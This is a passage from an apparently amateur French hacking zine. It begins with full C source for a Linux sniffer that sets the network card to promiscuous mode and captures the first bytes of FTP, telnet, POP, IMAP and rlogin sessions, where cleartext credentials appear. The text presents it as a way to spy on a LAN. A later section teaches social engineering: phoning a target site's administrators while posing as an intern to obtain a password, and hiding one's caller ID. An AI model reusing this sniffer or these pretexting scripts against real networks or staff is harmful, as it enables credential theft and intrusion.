#include <linux/tcp.h> 
#include <linux/if_ether.h> 
int openintf(char *); 
int read_tcp(int); 
int filter(void); 
int print_header(void); 
int print_data(int, char *); 
char *hostlookup(unsigned long int); 
void clear_victim(void); 
struct etherpacket 
{ 
struct ethhdr eth; 
struct iphdr ip; 
struct tcphdr tcp; 
char buff[8192]; 
}ep; 
struct 
{ 
unsigned long saddr; 
unsigned long daddr; 
unsigned short sport; 
unsigned short dport; 
int bytes_read; 
char active; 
time_t start_time; 
} victim; 
struct iphdr *ip; 
struct tcphdr *tcp; 
#define CAPTLEN 512 
#define TIMEOUT 30 
int openintf(char *d) 
{ 
int fd; 
struct ifreq ifr; 
int s; 
fd=socket(AF_INET, SOCK_PACKET, htons(0x800)); 
if(fd < 0) 
{ 
perror("cant get SOCK_PACKET socket"); 
exit(0); 
} 
strcpy(ifr.ifr_name, d); 
s=ioctl(fd, SIOCGIFFLAGS, &ifr); 
if(s < 0) 
{ 
close(fd); 
perror("cant get flags"); 
exit(0); 
} 
ifr.ifr_flags |= IFF_PROMISC; 
s=ioctl(fd, SIOCSIFFLAGS, &ifr); 
if(s < 0) perror("cant set promiscuous mode"); 
return fd; 
} 
int read_tcp(int s) 
{ 
int x; 
while(1) 
{ 
x=read(s, (struct etherpacket *)&ep, sizeof(ep)); 
if(x > 1) 
{ 
if(filter()==0) continue; 
x=x-54; 
if(x < 1) continue; 
return x; 
} 
} 
} 
int filter(void) 
{ 
int p; 
p=0; 
if(ip->protocol != 6) return 0; 
if(victim.active != 0) 
if(victim.bytes_read > CAPTLEN) 
{ 
printf("\n----- [CAPLEN Exceeded]\n"); 
clear_victim(); 
return 0; 
} 
if(victim.active != 0) 
if(time(NULL) > (victim.start_time + TIMEOUT)) 
{ 
printf("\n----- [Timed Out]\n"); 
clear_victim(); 
return 0; 
} 
if(ntohs(tcp->dest)==21) p=1; /* ftp */ 
if(ntohs(tcp->dest)==23) p=1; /* telnet */ 
if(ntohs(tcp->dest)==110) p=1; /* pop3 */ 
if(ntohs(tcp->dest)==109) p=1; /* pop2 */ 
if(ntohs(tcp->dest)==143) p=1; /* imap2 */ 
if(ntohs(tcp->dest)==513) p=1; /* rlogin */ 
if(ntohs(tcp->dest)==106) p=1; /* poppasswd */ 
if(victim.active == 0) 
if(p == 1) 
if(tcp->syn == 1) 
{ 
victim.saddr=ip->saddr; 
victim.daddr=ip->daddr; 
victim.active=1; 
victim.sport=tcp->source; 
victim.dport=tcp->dest; 
victim.bytes_read=0; 
victim.start_time=time(NULL); 
print_header(); 
} 
if(tcp->dest != victim.dport) return 0; 
if(tcp->source != victim.sport) return 0; 
if(ip->saddr != victim.saddr) return 0; 
if(ip->daddr != victim.daddr) return 0; 
if(tcp->rst == 1) 
{ 
victim.active=0; 
alarm(0); 
printf("\n----- [RST]\n"); 
clear_victim(); 
return 0; 
} 
if(tcp->fin == 1) 
{ 
victim.active=0; 
alarm(0); 
printf("\n----- [FIN]\n"); 
clear_victim(); 
return 0; 
} 
return 1; 
} 
int print_header(void) 
{ 
puts(" "); 
printf("%s => ", hostlookup(ip->saddr)); 
printf("%s [%d]\n", hostlookup(ip->daddr), ntohs(tcp->dest)); 
} 
int print_data(int datalen, char *data) 
{ 
int i=0; 
int t=0; 
victim.bytes_read=victim.bytes_read+datalen; 
for(i=0;i != datalen;i++) 
{ 
if(data[i] == 13) {puts(" ");t=0;} 
if(isprint(data[i])) {printf("%c", data[i]);t++;} 
if(t > 75) {t=0;puts(" ");} 
} 
} 
main() 
{ 
int s; 
s=openintf("eth0"); 
ip=(struct iphdr *)(((unsigned long)&ep.ip)-2); 
tcp=(struct tcphdr *)(((unsigned long)&ep.tcp)-2); 
signal(SIGHUP, SIG_IGN); 
clear_victim(); 
for(;;) 
{ 
read_tcp(s); 
if(victim.active != 0) print_data(htons(ip->tot_len)-sizeof(ep.ip)-sizeof(ep.tcp), ep.buff-2); 
} 
} 
char *hostlookup(unsigned long int in) 
{ 
static char blah[1024]; 
struct in_addr i; 
struct hostent *he; 
i.s_addr=in; 
he=gethostbyaddr((char *)&i, sizeof(struct in_addr),AF_INET); 
if(he == NULL) strcpy(blah, inet_ntoa(i)); 
else strcpy(blah, he->h_name); 
return blah; 
} 
void clear_victim(void) 
{ 
victim.saddr=0; 
victim.daddr=0; 
victim.sport=0; 
victim.dport=0; 
victim.active=0; 
victim.bytes_read=0; 
victim.start_time=0; 
} 

Voilà donc pour ce qui est des sniffer.
Pour ceux qui n'en comprenent pas l'interêt, imaginez que vous ayez un sniffer de placé sur 
une tête de réseau (= un serveur ) en réseau local... 
Vous pourrez alors interceptez tous les packets qui circulent entre les ordinateurs du réseau, 
les filtrez, et en tirez pourquoi pas des informations très interessantes...



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 24°/Le social engeneering ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Ou le summum du canular téléphonique...
Supposons que je veux pirater un site quelqueconque, www.exemple.com par exemple. 
Avec WSpingPr je récolte toutes les informations concernant le site. 
Puis je regarde les numeros de telephone des admins, pis je commence à me demander: 
Et si j'essayer de leur soutirer des infos par telephone? Voilà, c'est ça le S.E . 
Bien sûr, vous avez intêret à avoir beaucoup d'imagination au télephone, sinon vous serez bloqué...

Quelques petits point à respecter avant de commencer:

-Tachez d'avoir une voix mature, si vous avez une voix d'un gamin de 11 ans, laissez tomber ou 
faites de votre mieux pour camouflez votre voix.
-Essayez d'être le plus anonyme possible, telephonez a partir d'une cabine, et avant de composer
le numéro, faites le 3651, ca empechera le boitier de france telecom de reperer votre numéro.
-Avant de telephoner, réunissez sur un bloc notes toutes les informations concernant le site.

Bon, voilà, maintanant, prenons un exemple de conversation:

Vous: Bonjour, ici Franck, le stagiaire du 2ème. J'ai un problème, voilà y'a l'ordinateur qui 
me demande d'entrer un login et un mot de passe , alors je met le mot que monsieur Admin1 
(le nom d'un des admins pas celui ci :p) m'a donné, pis après ca me met "mot de passe incorrect" 
qu'est ce que je fais?
Admin2: Ouiiiiiii, je vois. Alors, prenez un crayon pour noter, le mot de passe est : ......

Ne vous exciter pas trop vite, ça se passera toujours aussi facilement... 
Mais les miracles ça arrive vous savez!!!   :))




²²²²²²²²²²²²²²²²²²
² 25°/Conclusion ²
²²²²²²²²²²²²²²²²²²

Et bah, voilà qui va clore mon tout premier zine sur le hacking...
En esperant qu'il vous a plu, écrivez moi a nickairmax@caramail.com pour me donner votre avis,
si vous avez des suggestions, commentaires...
A un prochain numéro ptet !!!

HACK TA MERE
[Kefka]

Rermerciements à Clad Strife pour les articles 9, 16, 22, 23 et 24
Sincères excuses vieux ;)






































 























 





 

















































 









